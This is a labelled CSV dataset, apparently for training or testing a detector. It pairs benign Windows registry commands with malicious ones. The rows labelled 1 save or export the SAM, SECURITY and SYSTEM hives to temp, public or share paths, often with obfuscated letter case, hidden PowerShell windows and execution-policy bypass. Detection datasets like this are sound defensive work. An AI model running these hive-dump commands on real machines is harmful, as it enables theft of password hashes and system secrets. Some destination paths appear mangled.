text,label
"REG.Exe  copY  ""hkU\SYSteM\CuRreNTcontROLSEt\SErvIces""  ""Hku\SoFTware\GoOgle\ChroME_689""",0
"Reg   UnLOAD   ""HKEy_cUrReNt_useR\soFTWaRE\CLaSsEs\SubKEY76""   /F",0
"rEG.Exe   ADd   ""Hkey_lOcaL_MAChInE\sOfTWarE\microsoft\wINdoWs\CURreNtvERSiON\sUBkEy89""      /t REG_dwOrd",0
Cmd.eXE /C Start /b reG.eXE   SAvE HkLm\sYsTEm   %tEmP%\sEC_BAckup.dAT /y,1
c:\WinDoWS\sySTEm32\cMd.exE /K rEG  Save hKEY_lOCaL_MaCHINE\SySteM \.\c$aCkUp.REg  /y,1
"REG   coPy   ""hKeY_cuRrenT_USer\cOnTRoL pANEL\dESkTOp\subkey59""   ""hkEY_cURrENt_uSeR\enVIronmEnt_254""",0
"cmd /c powershell -c ""reg.exe export  hkey_local_machine\security  c:\windows\temp\sam.save   /y""",1
"reg.EXe CopY ""hkEy_loCAl_MAchiNe\soFTwarE\MyApp\SETtiNGs"" ""HKEy_LOCAL_MaCHiNe\SOFtWARe\ClaSSeS_572""",0
cmd.eXE /c reg   expORt  HKey_LOCal_macHIne\sam  c:\uSErs\puBlIC\RegISTRy_EXpOrT.ReG /y,1
"reg add ""hkey_local_machine\software\google\chrome"" /f  /d ""1.0.0""",0
"cmD /c POwErSHell -C ""REg   exPORt HKLM\sysTEM  C:\USers\PUbLic\regIsTRY_EXPOrt.Reg /Y""",1
"sTArt /b REg ReSToRE ""hKEy_loCal_mAcHINE\HKEy_LOcal_mAChinE\sofTwArE\WoW6432noDe"" ""HkeY_LOcAL_MACHiNE\sofTwARe\mYApp\setTINGS_407""",0
POwerShELl -ExEc bYpAss -w hidden -C rEg.eXE SAve   HKLm\SAM  \.\C$AckUP.Reg,1
cmd.exe /c reg.exe  export hklm\security  \.\c$ackup.reg  /y,1
"rEg.EXe  ADd  ""HKEy_cUrrenT_USEr\soFtWaRE\mIcROsofT\WiNDOWS\cuRreNtveRSIoN""    /T Reg_Sz  /d ""1.0.0""",0
"reG Copy ""HKeY_loCaL_MaCHINE\SoFTwarE\POlIcIEs\mYCORP\SUbKEy53"" ""HKey_locAl_maChiNE\ControL PAnel\desktop_471""",0
reg.Exe sAvE   HkEY_lOcAl_mACHiNe\Sam   c:\tEMP\sYsTEM.HiVE   /Y,1
"reg unload ""hkey_local_machine\software\policies\mycorp\subkey44"" /v version",0
c:\wINDoWS\sySteM32\CMd.eXe /K rEG.exe sAvE   hkEY_lOCaL_machINE\sECURitY   \.\C$aCKUP.Reg,1
PoWersheLl -EXeC ByPaSs -W hiddeN -C REG   Export  hKlM\sAM  %temp%\sEC_bACkuP.DaT,1
poWErShELl -ComMANd reg   ExporT  hKEy_LOCaL_machinE\sam   \.\c$AcKup.reG /Y,1
"CMd /C rEG   QUery   ""HkeY_uSErS\SOFTWArE\GoOglE\chRoMe\SuBKeY55""   /V lastUPdaTE",0
pwsh -noprofile -c reg.exe  export hklm\system %temp%\sec_backup.dat   /y,1
cmd.exe /c start /b reg  export   hklm\system   c:\windows\temp\sam.save,1
"CmD /C PowERsHELL -C ""ReG   EXporT HKEy_LOCAl_maCHINe\SYstem %TemP%\sec_bAcKUp.dAT /Y""",1
"reg  restore  ""hkey_users\software\google\chrome\subkey64""  ""hkey_users\software\policies\mycorp_504""",0
"reg   compare   ""hku\software\classes""   ""hku\control panel\desktop_426""",0
"pOWERsHElL -C Reg.EXe   coPY   ""hKeY_USerS\HkEy_LOcAL_maCHInE\SOfTware\PoLIciEs\MICrOSOft""   ""HKey_usErS\SofTwArE\mYApp\sETtinGS_877""",0
C:\WindOWS\SYStem32\CMD.eXE /k REg  saVE  HKLm\SeCuRIty  c:\wiNdOWs\TEMp\SaM.SAvE /Y,1
"poWershElL -C ReG  SavE  ""HKEY_lOCal_MacHinE\HKeY_lOCAl_MachiNE\SYStem\cURRentcOntROLSeT\ConTRol""  ""D:\backUP\rEGisTry_HIvE.daT""  /y",0
c:\WinDOwS\sYstEm32\cMd.exe /k REg saVe   hkLM\sYsTem   \\LocalHosT\c$\__DuMp\SaM.BAk,1
poWerSHelL -COMmand REg.EXE eXporT   Hkey_lOcAL_mAChinE\seCuritY  C:\USErS\puBLIC\RegISTRY_ExpOrt.Reg   /y,1
"reg.exe delete ""hkey_users\hkey_local_machine\software\wow6432node\subkey38""",0
c:\wINdOws\SYsteM32\CMd.eXE /k REG   ExPorT HKEY_LoCaL_MAChinE\SaM c:\uSErS\pUBlIc\RegIstRY_ExPort.REg,1
reg.exe save   hklm\sam c:\users\public\registry_export.reg   /y,1
C:\WiNDOwS\sYSTEm32\Cmd.exE /K reg.EXE save hkeY_lOCaL_mAchine\SECUrITy  C:\USERS\pUbliC\REgISTRY_exPort.reg,1
"powershell -c reg   unload   ""hku\hkey_local_machine\software\wow6432node\subkey52""   /v lastupdate",0
Cmd.exe /c stART /B Reg exPOrt HKlm\sAM \.\C$ACkuP.reG,1
pOwerSHElL -ExeC BYPASS -w HIddeN -c Reg   SAVE   hklM\sam  c:\USErs\puBlIc\rEGISTry_ExPorT.REg,1
powershell -exec bypass -w hidden -c reg.exe  save  hklm\sam %temp%\sec_backup.dat /y,1
cmd.ExE /c StARt /B REg.eXE  sAvE HKLm\SYsTEm  C:\usERs\pUBLIC\reGiSTRY_eXPOrT.reg,1
Reg.ExE  expoRT hkLm\SysTEM  C:\WiNdoWS\TeMp\SAm.SAvE,1
rEG.ExE  saVE   hKlm\SySteM %teMP%\seC_Backup.dAT,1
cmd.exe /C Reg.EXE  sAVe  HKeY_LOcAL_MachiNE\SecUriTy   %TeMP%\SEC_bACKUp.dAt,1
"Reg.exE   savE   ""HKey_locAl_MAChinE\HKey_lOCaL_machInE\sofTWARE\WOw6432nOdE""   ""C:\UserS\PuBLiC\ChroMe_daTA.BAk""   /Y",0
"PowErsHEll -C REg savE ""hkeY_LOCAl_machine\HkeY_local_mAChiNe\sySTem\CUrrENtcoNtrOlsEt\cOntrOL"" ""%teMp%\Non_sENsiTIVE.hIVE""",0
"CMd /C Reg   DELete   ""HkEY_cuRrEnt_uSER\SyStEM\CURReNtcONtrOLset\SErvIcEs\sUbkEY22""   /v paTh",0
pwsh -noprofile -c reg.exe   export hklm\security c:\users\public\registry_export.reg,1
"StarT /b REg  cOPY  ""hKEy_CURRENT_User\SYSteM\CurReNtCONtrOLsET\ServiCeS""  ""HKeY_CurReNT_uSER\HKeY_local_MachINe\SysTEm\curreNtcONtRoLset\coNtrOl_568""",0
PowErSHeLL -coMmAND REG  SAve   Hklm\System \.\C$aCkUp.Reg,1
"REG Query ""Hkcu\HKEy_LoCaL_mAChine\sOFTware\wOW6432noDE\suBKEy58""",0
"reG  REStorE  ""hKCU\softWaRE\MyaPp\SEttinGs\SubkeY28""  ""hkcu\SofTwAre\MICrOSOFT\WInDOWS\CuRrenTVeRSIon_545""",0
"reG.EXe   delEtE   ""HKCU\sofTWARe\GOOgle\chROME""   /v laSTupDATE",0
POWeRshElL -comMaNd REg  EXpORt hklm\seCuriTy %tEmP%\sec_BACKuP.dat,1
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey74""  ""c:\windows\temp\software_dump.dat""",0
rEG SaVE Hkey_local_mAcHInE\SAM  c:\tEmp\SyStEm.HivE,1
"rEg  ADD  ""hkeY_LoCAl_mAchiNE\sofTwARe\goOGLE\cHroMe""  /V verSION  /t reG_dwORD  /d ""C:\PRograM fiLes\aPp""",0
CMD.exE /c stART /b reg.exE EXPOrT   HkEY_lOCal_machine\SAm  C:\TEMP\SYSteM.hIve,1
rEg SavE hkLM\SECuRITY  \.\c$ACkUp.ReG,1
"CmD /c ReG.EXe   uNloAD   ""HkeY_usERs\hKeY_LOcAL_MAChinE\soFtWAre\wOW6432nOde""   /V versIoN",0
"reG.Exe  save  ""HKeY_locAl_MAChInE\sOFtwARE\gOoGLe\chromE\SubKEY88""  ""D:\BackuP\rEgIstrY_hIVe.dAT""  /y",0
"cMD /C REG.EXE comPARE ""HkeY_lOCAL_machINE\SoftwARE\MyaPp\seTtingS\SUBKEY45"" ""hkey_LoCaL_macHiNe\envIronment_214""",0
"cmd /c powershell -c ""reg   export hkey_local_machine\system c:\temp\system.hive""",1
"reG savE ""hkey_UseRS\sOftware\POLiCiEs\mYcOrp"" ""%tEMp%\NoN_SeNsitiVe.hiVe"" /Y",0
"ReG  ComParE  ""HKey_uSers\SyStem\cURRENtconTRolSEt\seRViCeS\SubKEy9""  ""HKEY_UseRS\SofTwArE\mICroSOFt\WinDOWS\currEnTverSION_683""",0
powershell -command reg export  hkey_local_machine\security c:\users\public\registry_export.reg,1
pWSh -noprOfile -C reg SaVE   HKEY_LOCal_MACHinE\sAM   c:\temp\SySteM.HIVe   /Y,1
"reg   copy   ""hkey_local_machine\software\google\chrome\subkey84""   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_955""",0
"reG cOpy ""HKEY_LoCAl_MACHINE\HKEY_lOCAL_MachiNE\SofTwaRe\woW6432NODe"" ""hKeY_lOCAL_MaCHiNe\conTRoL pAnEL\dESktop_264""",0
"cMd /c Reg.EXE  saVe  ""hKeY_lOCAl_maChiNe\hKEy_LoCAL_mAchINE\SoFtWare\wOw6432nOde\SUbKEy36""  ""c:\temP\USeR_sEttings.ReG""",0
"reg.exe  add  ""hkey_users\environment""  /f",0
"reg  copy  ""hkey_users\environment""  ""hkey_users\software\policies\mycorp_564""",0
wmic.exe,0
powershell -exec bypass -w hidden -c reg.exe export  hklm\security  %temp%\sec_backup.dat,1
"STart /B REg   cOPY   ""hkU\hkey_LOCal_maCHinE\sofTwArE\poLICiEs\micRosoFt\sUbKEY51""   ""Hku\sOftwaRE\MicrOSoft\WINDows\cuRreNTvErsIon_497""",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""   ""c:\temp\user_settings.reg""",0
c:\windows\system32\cmd.exe /k reg.exe   export   hkey_local_machine\system   c:\windows\temp\sam.save  /y,1
"reg.exe query ""hkcu\software\policies\mycorp"" /f",0
c:\windows\system32\cmd.exe /k reg export hkey_local_machine\security   c:\temp\system.hive /y,1
"cmD /C POWErsHElL -C ""rEG.exE  Save   HKlM\sECurity  c:\WiNdows\tEmp\SAm.SavE /y""",1
PwSH -NoprOfile -c Reg   eXpORT   hKeY_loCaL_MachINE\SysTeM  \.\C$aCKup.reG,1
reg saVE   hKlM\sAM  c:\UserS\PuBLic\rEGIstRy_ExPort.REG,1
PwsH -NoPRofiLe -C Reg.exE ExpoRT  hKLm\SECuritY  c:\WIndoWs\tEMP\SAm.sAVE,1
pOWersHELl -cOmMand rEG.exe  ExPOrT  Hkey_local_MaChiNE\SecURITY   \.\c$aCkuP.REg   /y,1
"Reg.exe COmpAre ""HkeY_CUrRent_USeR\SOFTWAre\MicrosOfT\wiNDOws\curRENTVeRsiOn\SubKEy89"" ""hKey_CuRreNT_UsER\SySTeM\curREnTcOntroLset\servicEs_778""",0
cMD.eXe /c Start /b reg  savE   Hklm\sYsTeM C:\TeMP\SysTeM.HIVE,1
"cmD /C pOwErShElL -C ""Reg.ExE  EXporT  hkEY_lOcAl_MAchIne\SAm %TEMp%\sec_baCKUp.daT /Y""",1
reg.exe export hklm\security \\localhost\c$\__dump\sam.bak,1
PoWeRsHeLL -ComMand REg.Exe SaVe  hkEy_LocAL_MaChine\sYstem   \.\C$acKup.REG  /Y,1
CMD.exE /C sTARt /b REg   savE  HKlM\sAm C:\TeMp\SysTEm.HiVe  /Y,1
PowErshelL -cOMMaNd REG expORT Hkey_lOCAL_MaChINe\SystEm \.\C$AcKUp.REg,1
PoWeRsHElL -eXEC bypass -w hidDeN -c REg  saVe   HKeY_LOcAl_mACHINe\SYstEM   \\lOcalHOst\C$\__DUmp\sAm.bak /Y,1
"rEg   coPY   ""HKEY_cURRENT_USEr\HKEy_lOcAL_MaCHinE\soFTWaRE\POLicIES\MIcrosoft""   ""Hkey_cuRrEnt_UsER\EnViRONMenT_664""",0
"reg add ""hkey_local_machine\control panel\desktop""  /t reg_sz /d 1",0
pWSh -noProfILE -c rEg  ExpORT   hKLM\sYSTeM  \.\c$ackUP.Reg  /Y,1
"reg   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""   ""c:\windows\temp\software_dump.dat""",0
reG.exE sAVe   Hkey_loCal_machiNe\saM  c:\usERS\PUblIC\rEgistRY_EXpORT.reG,1
"reg.eXe  REsToRE  ""HkEY_cuRrEnt_USEr\SofTwArE\MyapP\seTTINGs""  ""Hkey_cUrrent_USer\hkeY_lOcAl_MAChinE\sYSTEM\curReNtcONtRolset\ConTrol_146""",0
C:\WIndowS\SYsTEM32\CMd.eXE /k REG.exE   sAVE  hKEY_lOCAl_MACHine\SeCurITy %TemP%\sEc_backUP.DAT,1
tasklist.exe,0
CMD.ExE /C REg.EXE  SAVe   HkLM\secUrITy \.\c$aCKup.Reg /Y,1
c:\windows\system32\cmd.exe /k reg.exe export  hkey_local_machine\security   c:\temp\system.hive,1
"STart /b rEG.ExE QUeRy ""hKEy_CurRENT_uSeR\hKeY_LOcAl_mAChinE\sYStem\currEntcoNtrolsEt\CoNtrOL"" /V vERSiON",0
pOwERSHEll -exEC BYPasS -W HiddeN -c rEg   SAVe   hKLm\SysteM   \.\c$Ackup.Reg,1
"CMd /c rEg comPAre ""HkCu\soFtWaRE\policieS\mYCOrP\SUBkeY23"" ""hkcu\SOfTwARe\GoOgLE\ChRoMe_454""",0
cMD.exe /C starT /B rEG  EXport   Hkey_LocAL_macHine\SyStem   %temp%\SeC_BAckUp.dat  /Y,1
"reg   restore   ""hkey_current_user\software\google\chrome""   ""hkey_current_user\system\currentcontrolset\services_509""",0
pwsh -noprofile -c reg.exe export hklm\security  c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg.exe export hklm\sam c:\users\public\registry_export.reg   /y,1
CmD.exe /c ReG   EXpOrT  hkeY_Local_machinE\sYStEm c:\TeMP\sYStem.HiVE  /Y,1
"POWERSHeLl -c rEG.EXE COMPARE ""hkU\SOFtwarE\myaPP\SetTiNgs"" ""hku\hkEy_LoCAl_mAcHInE\sOFTWARE\WoW6432NodE_941""",0
REg.exe   sAVe   hkEy_LocAl_MAChINE\SAm C:\UsErS\PubliC\REGIstry_ExpOrt.REg,1
PoWErSHeLL -eXEC byPass -w HiDdeN -C reg.EXe  SAvE  hKey_LOCAl_MAcHIne\seCUrITY   c:\WiNDOws\TEmP\saM.Save /Y,1
poWeRshELl -EXeC bYpaSS -W HIDDen -c Reg EXPOrt  hkEy_LOCaL_MAchINe\SAm   C:\temP\sySTeM.HiVe /y,1
"cMd /c REG.EXE  CopY  ""HKey_USErS\COntrol PanEl\deskTOp\SUBKeY77""  ""hkey_USerS\HkEy_lOCAL_maChine\sySTEm\CURRentcoNtrolset\controL_322""",0
PowERShelL -COmMaND Reg ExPorT   Hkey_LocAl_MacHiNE\sySTeM c:\usErs\pUbLic\regIsTry_eXpORt.rEg,1
Reg.EXE  saVE hklm\SAM  C:\Temp\sYSTEM.hiVe   /y,1
"reg   coMPARe   ""HKU\sOFtware\MYAPP\seTTINgS""   ""HkU\systEm\CurReNTCoNtROlsEt\sERviceS_214""",0
"CMd /c poweRsHElL -C ""rEG   eXport   Hkey_LoCAl_maChiNe\secUritY  C:\tEMP\sYSTem.HiVE   /Y""",1
pOWErShELL -CoMMAND REG   EXpoRT  hKlM\secURIty   c:\windowS\tEMp\Sam.sAvE  /Y,1
pOwErsHeLl -ExEC byPaSS -w hiDdEn -c REG.Exe   EXport  HklM\SeCURity   c:\tEMP\sYsTeM.HivE   /y,1
"reg.exe   compare   ""hku\software\myapp\settings""   ""hku\software\google\chrome_683""",0
"reg  query  ""hkey_current_user\software\classes\subkey16""",0
PWSh -NOPRoFIle -C reG.EXe  ExporT   HKeY_LOcaL_macHinE\sAM \\localHOSt\c$\__DUmP\saM.BAK /Y,1
poWErsHeLl -ExEc ByPasS -w HIdDEN -c Reg.EXe sAVE hkey_LOCAl_mACHIne\sAM   c:\userS\PUbLic\RegIsTrY_ExpOrT.reG,1
cmd.exe /c start /b reg.exe   export hklm\system   c:\users\public\registry_export.reg   /y,1
PWSh -noPROFiLe -C rEG.ExE   EXpoRT hKeY_Local_maChinE\sAM c:\USeRs\pUBLiC\ReGIstRy_eXporT.ReG   /y,1
"reg   unload   ""hkcu\hkey_local_machine\software\wow6432node\subkey29""",0
REG   SaVe hkEy_lOcaL_maCHinE\sam \\lOcALhOST\c$\__dUmp\SAM.BAK /y,1
"cmd /c reg  query  ""hku\hkey_local_machine\system\currentcontrolset\control""  /v lastupdate",0
